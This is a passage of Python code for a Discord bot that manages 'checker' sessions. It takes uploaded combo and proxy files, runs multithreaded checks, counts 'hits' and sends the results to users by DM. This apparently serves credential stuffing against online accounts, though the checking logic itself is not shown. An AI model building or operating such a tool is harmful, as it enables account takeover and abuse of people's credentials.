        await interaction.followup.send("🌐 **Optional**: Upload your proxies file or type `skip`:")
        def check_proxy(message):
            return (message.author == interaction.user and message.channel == interaction.channel and 
                    ((message.attachments and message.attachments[0].filename.endswith('.txt')) or
                     message.content.lower().strip() in ['skip', 'no', 'none']))
        try:
            proxy_msg = await bot.wait_for('message', check=check_proxy, timeout=30.0)
            if proxy_msg.attachments:
                proxies_attachment = proxy_msg.attachments[0]
                proxies_content = await proxies_attachment.read()
                proxies_path = f"temp_proxies_{interaction.id}.txt"
                with open(proxies_path, 'wb') as f: f.write(proxies_content)
                try: await proxy_msg.delete()
                except: pass
                await interaction.followup.send(f"✅ **Proxies loaded**")
            else:
                await interaction.followup.send("ℹ️ Continuing without proxies.")
        except asyncio.TimeoutError:
            await interaction.followup.send("ℹ️ Continuing without proxies.")
    
    class CtxLike:
        def __init__(self, interaction):
            self.author = interaction.user
            self.channel = interaction.channel
            self.send = interaction.followup.send
            self.id = interaction.id
    
    ctx_like = CtxLike(interaction)
    session = CheckerSession(ctx_like, threads, mapped_proxy_type, combos_path, proxies_path, webhook_url)
    active_checkers[session.session_id] = session
    asyncio.create_task(session.run_checker())

from discord import app_commands

@bot.tree.command(name="stop", description="Stop checking sessions")
@app_commands.describe(session_id="ID of the session you want to stop")
async def stop(interaction: discord.Interaction, session_id: str | None = None):
    try:
        await interaction.response.defer(thinking=True)
        stopped_sessions = []
        
        if session_id:
            session = active_checkers.get(session_id)
            if not session: return await interaction.followup.send("❌ Session not found.")
            if session.ctx.author.id != interaction.user.id: return await interaction.followup.send("❌ You can only stop your own sessions.")
            session.is_running = False
            stopped_sessions.append(session)
            await interaction.followup.send(f"🛑 Stopped session `{session_id}`")
        else:
            user_sessions = [s for s in active_checkers.values() if s.ctx.author.id == interaction.user.id and s.is_running]
            if not user_sessions: return await interaction.followup.send("❌ No active sessions.")
            for s in user_sessions:
                s.is_running = False
                stopped_sessions.append(s)
            await interaction.followup.send(f"🛑 Stopped **{len(stopped_sessions)}** session(s).")
        
        for s in stopped_sessions:
            try:
                await s.send_final_summary("🛑 Checker Stopped")
                await s.send_results_to_dm()
            except: pass
    except Exception as e:
        try: await interaction.followup.send(f"❌ Error: `{e}`")
        except: pass

@bot.tree.command(name="status", description="Check session status")
async def status(interaction: discord.Interaction, session_id: str = None):
    await interaction.response.defer()
    if session_id:
        if session_id in active_checkers:
            session = active_checkers[session_id]
            if session.ctx.author.id != interaction.user.id:
                await interaction.followup.send("❌ You can only check your own sessions.")
                return
            class CtxLike:
                def __init__(self, interaction):
                    self.author = interaction.user
                    self.channel = interaction.channel
                    self.send = interaction.followup.send
                    self.id = interaction.id
            session.ctx = CtxLike(interaction)
            await session.send_status_update()
        else:
            await interaction.followup.send("❌ Session not found.")
    else:
        user_sessions = [s for s in active_checkers.values() if s.ctx.author.id == interaction.user.id and s.is_running]
        if not user_sessions:
            await interaction.followup.send("❌ No active sessions.")
            return
        embed = discord.Embed(title="📊 Your Active Sessions", color=discord.Color.blue())
        for s in user_sessions:
            progress = f"{s.stats['checked']}/{s.stats['total']} ({s.stats['checked']/s.stats['total']*100:.1f}%)"
            embed.add_field(name=f"Session {s.session_id[:8]}...", value=f"Progress: {progress}\nHits: {s.stats['hits']}", inline=True)
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="list", description="List all active sessions")
async def list_sessions(interaction: discord.Interaction):
    await interaction.response.defer()
    active_sessions = [s for s in active_checkers.values() if s.is_running]
    if not active_sessions:
        await interaction.followup.send("❌ No active checker sessions.")
        return
    embed = discord.Embed(title="📋 All Active Sessions", color=discord.Color.purple())
    for s in active_sessions:
        user = s.ctx.author
        progress = f"{s.stats['checked']}/{s.stats['total']} ({s.stats['checked']/s.stats['total']*100:.1f}%)"
        embed.add_field(name=f"{user.name} - {s.session_id[:8]}...", value=f"Progress: {progress}\nHits: {s.stats['hits']}\nThreads: {s.threads}", inline=True)
    await interaction.followup.send(embed=embed)

@bot.event
async def on_connect():
    loadconfig_session()

def run_discord_bot(token):
    try: bot.run(token)
    except Exception as e: print(f"❌ Failed to start bot: {e}")

if __name__ == "__main__":
    load_dotenv()
    token = os.getenv("BOT_TOKEN")
    if not token:
        print("❌ No BOT_TOKEN provided")
        sys.exit(1)
    print("🚀 Starting Discord bot...")
    run_discord_bot(token)
